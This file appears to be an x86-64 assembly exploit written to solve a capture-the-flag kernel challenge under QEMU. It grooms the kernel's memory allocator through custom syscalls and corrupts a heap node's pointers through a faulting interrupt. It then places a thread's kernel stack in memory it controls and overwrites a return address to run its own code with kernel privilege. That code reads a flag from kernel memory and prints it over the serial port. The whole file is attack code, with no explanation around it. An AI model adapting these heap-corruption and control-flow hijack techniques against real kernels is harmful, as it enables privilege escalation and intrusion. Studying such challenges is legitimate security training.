OFFSET equ 0x40000

bits 64
start_thread_main:
    ; print out for testing
    mov rax, 0x800000000
    mov rbx, 'abcdefgh'
    syscall

    ; allocate memory region at address 0 that will be used later
    mov rax, 0x700000001
    mov rbx, 0
    mov rdx, 4096 * 16
    syscall

    ; create gap in memory allocator
    mov rax, 0x300000001
    mov rbx, 0x15000
    mov rdx, 4096 * 17
    syscall

    mov rax, 0x300000001
    mov rbx, 0x14000
    mov rdx, 4096
    syscall

    mov rax, 2
    mov rbx, 0x15000
    syscall

    ; print out for testing
    mov rax, 0x800000000
    mov rbx, 'abcdefgh'
    syscall

    ; copy jump back to address 0x23
    mov rax, .jump_back + OFFSET
    mov rbx, 0x23
.copy:
    mov cl, byte [rax]
    mov byte [rbx], cl

    inc rax
    inc rbx
    cmp rax, .jump_back_end + OFFSET
    jl .copy

    ; print out for testing
    mov rax, 0x800000000
    mov rbx, 'abcdefgh'
    syscall

    ; create the curropt thread
    mov rax, 3
    mov rbx, corrupt_thread + OFFSET
    mov rdx, rsp
    syscall

    ; yield to that thread
    mov rax, 4
    syscall

    ; set the size of the node this address is pointing to 0x10000 (size of kernel stack)
    ; also set prev and next pointer to null
    mov qword [0x18], 0
    mov qword [0x18 + 0x8], 0
    mov qword [0x18 + 0x10], 0x10000

    ; create other thread with kernel stack in bad region
    mov rax, 3
    mov rbx, bad_thread + OFFSET
    mov rdx, rsp
    syscall

    ; copy jump back to address 0x23, because it was overwritten with heap corruption
    mov rax, .jump_back + OFFSET
    mov rbx, 0x23
.copy2:
    mov cl, byte [rax]
    mov byte [rbx], cl

    inc rax
    inc rbx
    cmp rax, .jump_back_end + OFFSET
    jl .copy2

    ; yield to other thread
    mov rax, 4
    syscall

    ; overwrite return address
    mov rax, ace_code + OFFSET
    mov qword [4096 * 16 - 136], rax

.yield_loop:
    mov rax, 4
    syscall
    jmp .yield_loop

; code that runs after corrupting interrupt
.jump_back:
    ; don't destroy thread to avoid freeing stack and messing up exploit
    mov rax, 4
    syscall
    jmp .jump_back
.jump_back_end:

corrupt_thread:
    ; rsp will be sent into flags
    mov rsp, 0x202
    ; corrupt next pointer
    ; will cause a return to rip 0x23, which is where the .jump_back code is
    int 14

bad_thread:
.yield_loop:
    mov rax, 4
    syscall
    jmp .yield_loop

ace_code:
    cli

    ; address of flag
    mov rcx, 0xffffff8000142290
    mov rbx, 0

.print_flag:
.wait_ready:
    ; wait for serial port to be ready
    mov dx, 0x3fd
    in al, dx

    test al, 1 << 5
    jz .wait_ready

    mov al, byte [rcx + rbx]

    mov dx, 0x3f8
    out dx, al

    inc rbx
    cmp rbx, 56
    jl .print_flag
    
    ; shut down qemu
    mov al, 0xfe
    out 0x64, al